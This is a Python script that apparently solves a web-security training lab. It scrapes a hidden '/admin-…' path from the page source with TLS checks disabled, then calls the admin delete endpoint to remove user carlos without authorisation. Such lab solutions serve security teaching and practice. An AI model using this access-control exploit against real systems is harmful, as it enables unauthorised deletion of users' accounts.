#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def find_admin_url(s, url):
    print("[*] Finding the admin panel endpoint...")
    r = s.get(url, verify=False)
    match = re.search(r'/admin-[A-Za-z0-9]+', r.text)
    if match:
        admin_url = match.group()
        print(f"[+] The admin panel is located at: {url}{admin_url}")
        return admin_url
    else:
        print("[-] Admin panel endpoint not found")
        return False

def delete_carlos(s, url):
    admin_url = find_admin_url(s, url)
    if not admin_url:
        print("[-] Unable to find admin panel...")
        sys.exit(1)
    print("[*] Deleting Carlos...")
    delete_url = url + admin_url + "/delete?username=carlos"
    r = s.get(delete_url, verify=False)
    if "Congratulations" not in r.text:
        print("[-] Error deleting Carlos...")
        sys.exit(1)
    print("[+] Deleted Carlos... Lab solved")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    delete_carlos(s, url)

if __name__=="__main__":
    main()